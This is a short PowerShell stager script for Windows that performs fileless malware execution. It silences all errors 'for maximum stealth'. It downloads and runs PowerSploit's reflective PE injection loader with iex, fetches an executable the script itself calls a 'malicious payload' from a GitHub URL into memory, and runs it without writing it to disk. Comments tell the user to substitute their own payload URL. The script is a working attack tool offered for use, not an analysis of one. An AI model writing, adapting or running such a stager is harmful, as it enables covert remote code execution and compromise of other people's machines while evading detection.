# --- Stager for Windows Systems ---
# This script performs a true fileless injection.
# 1. Downloads a reflective loader into memory.
# 2. Downloads the target executable (payload) into a byte array in memory.
# 3. Uses the loader to execute the payload from memory.

# Disable error reporting for maximum stealth.
$ErrorActionPreference = "SilentlyContinue"

try {
    # URL of the Invoke-ReflectivePEInjection script. A canonical, trusted source.
    $LoaderURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
    
    # URL of your final Go payload for Windows.
    # !! IMPORTANT: Replace this with the raw URL to your 'dtt-tools.exe' binary !!
    $PayloadURL = "https://raw.githubusercontent.com/aman20244/poc-bins/main/dtt-tools.exe"


    # Step 1: Download and execute the reflective loader script in memory.
    # After this line runs, the Invoke-ReflectivePEInjection function is available in our session.
    iex (New-Object System.Net.WebClient).DownloadString($LoaderURL)

    # Step 2: Download the malicious payload as a byte array into memory.
    # Using DownloadData() is key, as it gets raw bytes, not text.
    $PEBytes = (New-Object System.Net.WebClient).DownloadData($PayloadURL)

    # Step 3: Execute the payload from the byte array in memory.
    # The new process runs within the memory space of this PowerShell instance.
    # It will never appear on disk.
    Invoke-ReflectivePEInjection -PEBytes $PEBytes

} catch {
    # If anything fails, do nothing. Don't show an error window.
}
